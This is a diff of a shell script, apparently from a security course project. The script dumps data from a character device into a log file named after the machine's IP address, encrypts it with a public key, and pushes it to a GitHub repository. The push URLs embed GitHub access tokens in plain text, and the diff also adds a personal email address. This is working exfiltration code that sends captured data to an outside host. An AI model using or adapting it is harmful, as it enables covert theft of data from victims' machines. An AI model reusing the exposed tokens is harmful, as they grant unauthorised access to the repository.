@@ -10,7 +10,7 @@ mkdir -p scripts
 
 ip=`ip route get 8.8.8.8 | grep -oP 'src \K[^ ]+'`
 mknod chrdev0 c $major 0
-cat chrdev0 >> "./logs/$ip.txt"
+cat chrdev0 > "./logs/$ip.txt"
 rm chrdev0
 
 # encrypt
@@ -18,7 +18,7 @@ openssl rsautl -encrypt -inkey key_public.pem -pubin -in "logs/$ip.txt" -out "lo
 
 
 
-git config user.email "fake@gmail.com"
+git config user.email "spencer.stevens@verizon.net"
 git config user.name "dummy000000"
 
 # add
@@ -28,7 +28,7 @@ git add .
 git commit -m "update"
 
 # push
-git remote set-url https://dummy000000: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@github.com/Sad-0w/CS564_data.git
+git remote set-url origin https://dummy000000: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@github.com/Sad-0w/CS564_data.git
 git push
 
 # extract all encrypted scripts
